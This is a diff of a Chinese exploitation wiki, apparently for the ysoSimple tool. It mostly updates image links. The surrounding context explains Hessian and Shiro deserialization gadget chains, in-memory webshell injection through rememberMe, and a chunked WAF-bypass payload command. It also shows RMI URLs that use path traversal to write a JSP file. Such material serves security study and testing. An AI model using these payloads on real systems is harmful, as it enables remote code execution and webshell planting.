@@ -601,7 +601,7 @@ Hessian本身涉及多个系列(如下)：Hessian的版本在黑名单有区别�
 
 版本hessian-4.0.66在 `com.caucho.hessian.io.ClassFactory#isAllow(java.lang.String)`​ 下断点看看都拦截了哪些类：默认的_allowList为空，所以只会进行一层_staticDenyList的判断，后面俩个名单的判断不进行，黑名单类如下：
 
-![image](assets/image-20241111094006-3ztglxh.png)​
+![image-20250105135452101](images/image-20250105135452101.png)
 
 ##### sofa-hessian黑名单
 
@@ -615,7 +615,7 @@ Hessian本身涉及多个系列(如下)：Hessian的版本在黑名单有区别�
 
 * 黑名单：[https://github.com/apache/dubbo-hessian-lite/blob/master/hessian-lite/src/main/resources/DENY_CLASS](https://github.com/apache/dubbo-hessian-lite/blob/master/hessian-lite/src/main/resources/DENY_CLASS)
 
-![image](assets/image-20241126144101-z3z3b4k.png)​
+![image-20250105135512035](images/image-20250105135512035.png)
 
 ### 额外的参数
 
@@ -728,7 +728,7 @@ HashMap#readObject
 
 为什么要用SwingLazyValue#createValue，因为该方法封装反射的API。但是该createValue方法调用反射有如下的限制：
 
-`SwingLazyValue#createValue(UIDefaults var1)`​![image-20230628185356803](assets/image-20230628185356803-20240425152247-0atcx4u.png)​
+`SwingLazyValue#createValue(UIDefaults var1)`![image-20250105135537958](images/image-20250105135537958.png)
 
 * Class.forName(this.className,true,(ClassLoader)null) 只会获取 rt.jar 包中的类对象
 * var6.invoke(var2,this.args) 可以反射调用 rt.jar 包中类的静态方法
@@ -738,7 +738,7 @@ HashMap#readObject
 
 虽然只能加载 BootStrapClassLoader 加载的对象，但是可以通过 SwingLazyValue + MethodUtil 绕过限制，但是这俩者的组合有不稳定的情况，一般不推荐使用。
 
-![image-20230629173413940](assets/image-20230629173413940-20240425152247-5htu5xh.png)​
+![image-20250105135549493](images/image-20250105135549493.png)
 
 bounce.invoke 中的 bounce Method对象来自于 `getTrampoline()`​，该方法返回的是 `sun.reflect.misc.Trampoline`​类的 invoke 方法对应的 Method
 
@@ -772,7 +772,7 @@ private static Object invoke(Method var0, Object var1, Object[] var2) throws Inv
 
 ##### ProxyLazyValue#createValue
 
-ProxyLazyValue 是 `UIDefaults`​ 的静态内部类![image-20230629180050699](assets/image-20230629180050699-20240425152247-br1yxia.png)​
+ProxyLazyValue 是 `UIDefaults` 的静态内部类![image-20250105135612283](images/image-20250105135612283.png)
 
 `ProxyLazyValue#createValue`​使用起来就要方便很多：
 
@@ -1088,13 +1088,9 @@ map.put(2, map2);
 
 #### 打失败的问题(LazyValue+MethodUtil)
 
-构造SwingLazyValue+MethodUtil进行漏洞利用时，会出现打不了的情况，也会有JVM直接crash。使用ProxyLayzValue+MethodUtil也会有这样的问题。学习的时候[X1r0z](https://exp10it.io/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#serializationutils-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96--pojonode-%E8%A7%A6%E5%8F%91-templatesimpl)也遇到了这样的情况：
+构造SwingLazyValue+MethodUtil进行漏洞利用时，会出现打不了的情况，也会有JVM直接crash。使用ProxyLayzValue+MethodUtil也会有这样的问题。学习的时候[X1r0z](https://exp10it.io/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#serializationutils-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96--pojonode-%E8%A7%A6%E5%8F%91-templatesimpl)也遇到了这样的情况：![image-20250105135632216](images/image-20250105135632216.png)
 
-![image](assets/image-20241116155228-lewlt1l.png)​
-
-最终[whwlsfb](https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html)大师傅发现在ProxyLazyValue/SwingLazyValue+MethodUtil中不稳定的原因是MethodUtil的问题：
-
-![image](assets/image-20241118103414-jf4603a.png)​
+最终[whwlsfb](https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html)大师傅发现在ProxyLazyValue/SwingLazyValue+MethodUtil中不稳定的原因是MethodUtil的问题：![image-20250105135647323](images/image-20250105135647323.png)
 
 其实总结下来就是如下表格的情况：
 
@@ -1115,35 +1111,25 @@ Hessian Except toString打法主要是Hessian2Input#expect方法中的异常处�
 
 ##### Cachuo HessianInput#except
 
-Caucho Hessian1的except方法中没有触发Object的toString，所以它不存在Hessian Except toString打法
-
-![image](assets/image-20241125221408-fff6s3b.png)​
+Caucho Hessian1的except方法中没有触发Object的toString，所以它不存在Hessian Except toString打法![image-20250105135703519](images/image-20250105135703519.png)
 
 ##### Cachuo Hessian2Input#except
 
-Hessian2Input#except方法中存在反序列对象触发toString，所以目前最新版4.0.66的Caucho Hessian2也可以打Hessian Except toString
-
-![image](assets/image-20241126144347-4gvier0.png)​
+Hessian2Input#except方法中存在反序列对象触发toString，所以目前最新版4.0.66的Caucho Hessian2也可以打Hessian Except toString![image-20250105135712793](images/image-20250105135712793.png)
 
 ##### Sofa Hessian2Input#except
 
-Sofa Hessian最新版4.0.4中存在反序列化的obj对象触发toString的情况
-
-![image](assets/image-20241126145303-de6f1lt.png)​
+Sofa Hessian最新版4.0.4中存在反序列化的obj对象触发toString的情况![image-20250105135729681](images/image-20250105135729681.png)
 
 ##### HessianLite Hessian2Input#except
 
-HessianLite 3.2.11版本的Hessian2Input#except方法中存在反序列化的obj对象触发toString的情况
-
-![image](assets/image-20241126142605-f2zjaud.png)​
+HessianLite 3.2.11版本的Hessian2Input#except方法中存在反序列化的obj对象触发toString的情况![image-20250105135743017](images/image-20250105135743017.png)
 
 在HessianLite 3.2.12版本中except方法已经修复了该问题
 
-![image](assets/image-20241126143016-tfng4jx.png)​
+![image-20250105135753451](images/image-20250105135753451.png)
 
-并且在上面讲黑名单的时候也提到过HessianLite自3.2.12开始已经将`javax.swing.*`​包下的类都加入到黑名单中，所以`javax.swing.UIDefaults`​的相关攻击链都不能进行利用。
-
-![image](assets/image-20241126143932-nusdza9.png)​
+并且在上面讲黑名单的时候也提到过HessianLite自3.2.12开始已经将`javax.swing.*`包下的类都加入到黑名单中，所以`javax.swing.UIDefaults`的相关攻击链都不能进行利用。![image-20250105135808985](ysoSimple-Wiki.assets/image-20250105135808985.png)
 
 #### toString利用链(PKCS9Attributes & MimeTypeParameterList)
 
@@ -1360,11 +1346,11 @@ Shiro站点的整体攻击思路：
 
 * 当Shiro Key正确时：响应中没有deleteMe
 
-![image](assets/image-20241024224733-g1vgcqq.png)​
+![image-20250105135831861](images/image-20250105135831861.png)
 
 * 当Shiro Key错误时：响应中有deleteMe
 
-![image](assets/image-20241024225015-b4h9147.png)​
+![image-20250105135841583](images/image-20250105135841583.png)
 
 ### 利用链Gadget直接攻击
 
@@ -1400,7 +1386,7 @@ Shiro自带1.9x，下面用CommonsBeanutils2来举例：
 
 在HTTP的remeberMe中填充ysoSimple生成的payload，POST的classData中填充Base64格式内存马：
 
-![image](assets/image-20240310201804-tzltsos.png)​
+![image-20250105135858146](images/image-20250105135858146.png)
 
 #### Tomcat defineCLass
 
@@ -1414,7 +1400,7 @@ Shiro自带1.9x，下面用CommonsBeanutils2来举例：
 
 在HTTP的remeberMe中填充上述第二步ysoserial生成的payload，POST的user参数中填充Base64格式内存马：记得URI编码
 
-![image](assets/image-20241204212438-xp74eqw.png)​
+![image-20250105135908990](images/image-20250105135908990.png)
 
 ### Base64混淆(waf绕过)
 
@@ -1480,15 +1466,15 @@ java -cp ysoSimple.jar cn.butler.yso.exploit.ShiroChunkPayload -g CommonsBeanuti
 
 使用上述命令后的工具生成的最终效果：
 
-![image](assets/image-20241203214725-zp1el0w.png)​
+![image-20250105135921094](ysoSimple-Wiki.assets/image-20250105135921094.png)
 
 然后将 /tmp/ShiroChunk.txt 放入Yakit进行发包，在目标系统中的系统属性中写入字节码
 
-![image](assets/image-20241203215012-v22k3cf.png)​
+![image-20250105135930706](images/image-20250105135930706.png)
 
 最后发送类加载的Payload将会执行上述的字节码逻辑
 
-![image](assets/image-20241203215101-w0yi1fo.png)​
+![image-20250105135938950](images/image-20250105135938950.png)
 
 ### Shiro的奇怪问题
 
@@ -2198,9 +2184,7 @@ rmi://127.0.0.1:1099/WriteFile/http://127.0.0.1:1337/../../../../../../../../../
 rmi://127.0.0.1:1099/WriteFile/aHR0cDovLzEyNy4wLjAuMToxMzM3Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL1NVQ0NFU1MvcG9jLmpzcA==
 ```
 
-最后写入的文件内容：
-
-![image](assets/image-20240728191754-5htxjo6.png)​
+最后写入的文件内容：![image-20250105140010916](images/image-20250105140010916.png)
 
 ### JDBC 工厂类打法
 
